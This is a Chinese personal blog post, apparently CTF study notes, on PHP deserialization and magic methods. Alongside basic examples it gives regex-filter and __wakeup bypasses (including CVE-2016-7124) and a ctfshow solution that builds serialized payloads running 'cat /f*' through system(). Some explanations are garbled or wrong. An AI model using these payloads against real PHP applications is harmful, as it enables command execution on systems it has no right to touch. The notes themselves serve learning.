<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="反序列化初步, wuk0Ng">
    <meta name="description" content="wuk0Ng的个人博客">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>反序列化初步 | wuk0Ng</title>
    <link rel="icon" type="image/jpeg" href="/shaoqing.jpg">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 7.3.0"></head>



   <style>
    body{
       background-image: url(/medias/my_background.jpg);
       background-repeat:no-repeat;
       background-size:cover;
       background-attachment:fixed;
    }
</style>



<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/jiushen.jpg" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">wuk0Ng</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/jiushen.jpg" class="logo-img circle responsive-img">
        
        <div class="logo-name">wuk0Ng</div>
        <div class="logo-desc">
            
            wuk0Ng的个人博客
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/web-wuk0Ng" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/web-wuk0Ng" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">反序列化初步</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/CTF/">
                                <span class="chip bg-color">CTF</span>
                            </a>
                        
                            <a href="/tags/%E6%AF%94%E8%B5%9B/">
                                <span class="chip bg-color">比赛</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/%E8%AE%B0%E5%BD%95/" class="post-category">
                                记录
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2025-06-15
                </div>
                

                

                

                

                
            </div>
        </div>
        <hr class="clearfix">

        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <p>phpstorm的配置比其他的一些都要复杂些，我又不小心给我的一个东西删了<br>算是第三次配置php的环境了<br>注意：不能仅在这里选择php.exe，需要的是PHP的集成开发环境WAMP64</p>
<h1 id="各方法基本用法"><a href="#各方法基本用法" class="headerlink" title="各方法基本用法"></a>各方法基本用法</h1><h2 id="consrtuct"><a href="#consrtuct" class="headerlink" title="__consrtuct()"></a>__consrtuct()</h2><p>_construct()方法,输出结果：对象被创建了__consrtuct()。一个类进行序列化，触发这个魔术方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Stu</span><br><span class="line">&#123;</span><br><span class="line">    public $name = &#x27;aa&#x27;;</span><br><span class="line">    public $age = 18;</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;对象被创建了__consrtuct()&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new Stu();</span><br><span class="line">serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>输出：对象被创建了__consrtuct()</p>
<h2 id="destruct-，-wakeup"><a href="#destruct-，-wakeup" class="headerlink" title="__destruct()，__wakeup()"></a>__destruct()，__wakeup()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Stu</span><br><span class="line">&#123;</span><br><span class="line">    public $name = &#x27;aa&#x27;;</span><br><span class="line">    public $age = 18;</span><br><span class="line"></span><br><span class="line">    function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;执行了反序列化__wakeup()&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;对象被销毁了__destruct()&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a=new Stu();</span><br><span class="line">$b = serialize($a);</span><br><span class="line">unserialize($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>结果：执行了反序列化__wakeup()对象被销毁了__destruct()对象被销毁了__destruct()<br>反序列化会创建一个新的对象，这个新的对象会调用__wakeup()<br>然后我们反序列化，unserialize($b)没有被接收到其值，这个反序列化对象在语句执行完成后立即失去作用，php就会马上回收它，触发__destruct()<br>然后就是脚本执行到最后一行时，php开始清理$a，因为$a也是一个对象，php自动销毁，触发__destruct()</p>
<h2 id="oc-d-i研究"><a href="#oc-d-i研究" class="headerlink" title="&#x2F;[oc]:\d+:&#x2F;i研究"></a>&#x2F;[oc]:\d+:&#x2F;i研究</h2><p>OC正则表达式，意思就是过滤掉一些东西<br>\d+:&#x2F;i什么意思？<br>\d：匹配一个数字字符。等价于[0-9]<br>+:匹配前面的子表达式一次或多次。例如，’zo+’能匹配”zo”以及”zoo”，但不能匹配”z”。+等价于{1,}.<br>&#x2F;i:表示匹配的时候不区分大小写<br>思考下面的怎么绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&#x27;/[oc]:\d+:/i&#x27;, $var)) &#123; </span><br><span class="line">        die(&#x27;stop hacking!&#x27;); </span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这个正则是基本一定要把你的数字给过滤掉的<br>我们在paylaod表示类的长度的这类中，加上一个+就可以绕过了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:+7:&quot;Student&quot;:1:&#123;s:1:&quot;a&quot;;i:123;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="wakeup-的绕过方式"><a href="#wakeup-的绕过方式" class="headerlink" title="__wakeup()的绕过方式"></a>__wakeup()的绕过方式</h2><p>1.属性个数大于真实个数（cve-2016-7124）<br>影响范围：php5&lt;5.6.25，php7&lt;7.0.10</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;Student&quot;:1:&#123;s:1:&quot;a&quot;;i:123;&#125;</span><br></pre></td></tr></table></figure>
<p>假设这个的paylaod是这个，然后就是我们第四个位置的1，代表我们的这个student类的属性个数，我们把1改为2即可绕过wakeup函数<br>2.如果类中同时定义了__wakeup()和__unserialize()两个魔术方法，则只会触发__unserialize()，__wakeup()方法会被忽略<br>3.C绕过<br>O标识代表对象类型，而C标识符代表类名类型。如果将O替换为C，则在反序列化时会将其解释为一个新的类名字符串，从而创建一个新的类而不是对象。因为这个新的类没有被序列化过，所以它没有任何属性和方法。这样一来，__wakeup()魔术方法就不会被自动调用<br>常规绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:4:“User”:2:&#123;s:3:“age”;i:20;s:4:“name”;s:4:“daye”;&#125;</span><br><span class="line">变成下面</span><br><span class="line">C:4:“User”:2:&#123;&#125;</span><br></pre></td></tr></table></figure>
<p>4.C进阶绕过：愚人杯3rd [easy_php]</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class ctfshow&#123;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        die(&quot;not allowed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        system($this-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$data = $_GET[&#x27;1+1&gt;2&#x27;];</span><br><span class="line"></span><br><span class="line">if(!preg_match(&quot;/^[Oa]:[\d]+/i&quot;, $data))&#123;</span><br><span class="line">    unserialize($data);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这里的核心是绕过__wake()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ctfshow&#123;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        die(&quot;not allowed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        system($this-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">$a=new ctfshow();</span><br><span class="line">echo serialize($a);</span><br><span class="line">//O:7:&quot;ctfshow&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></figure>
<p>我们得到paylaod</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;ctfshow&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以直接改C，但是这里都没有命令执行的步骤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">     </span><br><span class="line">class ctfshow&#123;</span><br><span class="line">	public $ctfshow=&quot;cat /f*&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$A=new ArrayObject;</span><br><span class="line">$A-&gt;a=new ctfshow;</span><br><span class="line">echo serialize($A);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>生成结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;ArrayObject&quot;:4:&#123;i:0;i:0;i:1;a:0:&#123;&#125;i:2;a:1:&#123;s:1:&quot;a&quot;;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:7:&quot;cat /f*&quot;;&#125;&#125;i:3;N;&#125;</span><br></pre></td></tr></table></figure>
<p>假设要传入的参数是name,我们将name进行编码，然后再将O改为C就可以了<br>5.或者使用SplStack()也是可以的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">class ctfshow&#123;</span><br><span class="line">	public $ctfshow=&quot;cat /f*&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new ctfshow;</span><br><span class="line">$A=new SplStack();</span><br><span class="line">$A-&gt;push($a);</span><br><span class="line">echo serialize($A);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>6.GC回收机制后面遇见了再说</p>
<h2 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Stu</span><br><span class="line">&#123;</span><br><span class="line">    public $name = &#x27;aa&#x27;;</span><br><span class="line">    public $age = 18;</span><br><span class="line"></span><br><span class="line">    function __sleep()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;执行了序列化__sleep&#x27;;</span><br><span class="line">        return array(&#x27;name&#x27;,&#x27;age&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = new Stu();</span><br><span class="line">serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>输出结果：执行了序列化__sleep<br>__sleep()是php中的一个魔术方法，会在我对对象执行<code>serialize()</code>时自动调用</p>
<h2 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class MyClass &#123;</span><br><span class="line">    public function __call($name, $arguments) &#123;</span><br><span class="line">        echo &quot;调用了不存在的方法 $name，参数为：&quot;. implode(&#x27;, &#x27;, $arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj = new MyClass();</span><br><span class="line">$obj-&gt;nonExistentMethod(&#x27;param1&#x27;, &#x27;param2&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>结果：调用了不存在的方法 param1, param2</p>
<h2 id="前面为类，后面方法和参数"><a href="#前面为类，后面方法和参数" class="headerlink" title="::前面为类，后面方法和参数"></a>::前面为类，后面方法和参数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class MyStaticClass &#123;</span><br><span class="line">    public static function __callStatic($name, $arguments) &#123;</span><br><span class="line">        echo &quot;以静态方式调用了不存在的方法 $name，参数为：&quot;. implode(&#x27;, &#x27;, $arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MyStaticClass::nonExistentStaticMethod(&#x27;param1&#x27;, &#x27;param2&#x27;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>结果：以静态方式调用了不存在的方法 param1, param2</p>
<h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">call_user_func() 函数概述</span><br><span class="line">在 PHP 里，call_user_func() 是一个十分实用的函数，其功能是调用任意用户自定义的函数。借助这个函数，你能够在运行时动态地调用函数，增强代码的灵活性。</span><br><span class="line">基本语法</span><br><span class="line">php</span><br><span class="line"></span><br><span class="line">call_user_func(callable $callback, mixed ...$parameters): mixed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $callback：这是一个必选参数，代表要调用的函数。它可以是函数名（以字符串形式呈现）、对象的方法（用数组形式表示，数组第一个元素为对象实例，第二个元素为方法名）或者静态类方法（同样用数组形式，不过第一个元素是类名，第二个元素是方法名）。</span><br><span class="line">    $parameters：这是可选参数，为传递给被调用函数的参数。</span><br><span class="line"></span><br><span class="line">用法示例</span><br><span class="line">调用普通函数</span><br><span class="line">php</span><br><span class="line"></span><br><span class="line">function greet($name) &#123;</span><br><span class="line">    return &quot;Hello, $name!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result = call_user_func(&#x27;greet&#x27;, &#x27;John&#x27;);</span><br><span class="line">echo $result; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在这个例子中，我们定义了一个 greet 函数，然后使用 call_user_func 来调用它，并且传递了参数 &#x27;John&#x27;。</span><br><span class="line">调用对象的方法</span><br><span class="line">php</span><br><span class="line"></span><br><span class="line">class MyClass &#123;</span><br><span class="line">    public function sayHello($name) &#123;</span><br><span class="line">        return &quot;Hello, $name!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj = new MyClass();</span><br><span class="line">$result = call_user_func([$obj, &#x27;sayHello&#x27;], &#x27;Jane&#x27;);</span><br><span class="line">echo $result; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">这里，我们创建了 MyClass 的一个对象实例 $obj，接着通过 call_user_func 调用该对象的 sayHello 方法，并传入参数 &#x27;Jane&#x27;。</span><br><span class="line">调用静态类方法</span><br><span class="line">php</span><br><span class="line"></span><br><span class="line">class MyStaticClass &#123;</span><br><span class="line">    public static function sayGoodbye($name) &#123;</span><br><span class="line">        return &quot;Goodbye, $name!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result = call_user_func([&#x27;MyStaticClass&#x27;, &#x27;sayGoodbye&#x27;], &#x27;Bob&#x27;);</span><br><span class="line">echo $result; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">此例中，我们使用 call_user_func 调用了 MyStaticClass 类的静态方法 sayGoodbye，同时传入参数 &#x27;Bob&#x27;。</span><br><span class="line">call_user_func($arguments[0]); 含义</span><br><span class="line">call_user_func($arguments[0]); 意味着将 $arguments 数组的第一个元素当作要调用的函数，然后调用该函数。不过，要保证 $arguments[0] 是一个有效的可调用对象（比如函数名、对象方法或静态类方法），不然会引发错误。</span><br><span class="line"></span><br><span class="line">以下是一个示例：</span><br><span class="line"></span><br><span class="line">php</span><br><span class="line"></span><br><span class="line">function add($a, $b) &#123;</span><br><span class="line">    return $a + $b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$arguments = [&#x27;add&#x27;, 2, 3];</span><br><span class="line">$result = call_user_func($arguments[0], $arguments[1], $arguments[2]);</span><br><span class="line">echo $result; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在这个例子里，$arguments[0] 是 &#x27;add&#x27;，也就是我们之前定义的 add 函数名，接着使用 call_user_func 调用该函数，并且传递了 $arguments[1] 和 $arguments[2] 作为参数。最终输出结果为 5。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
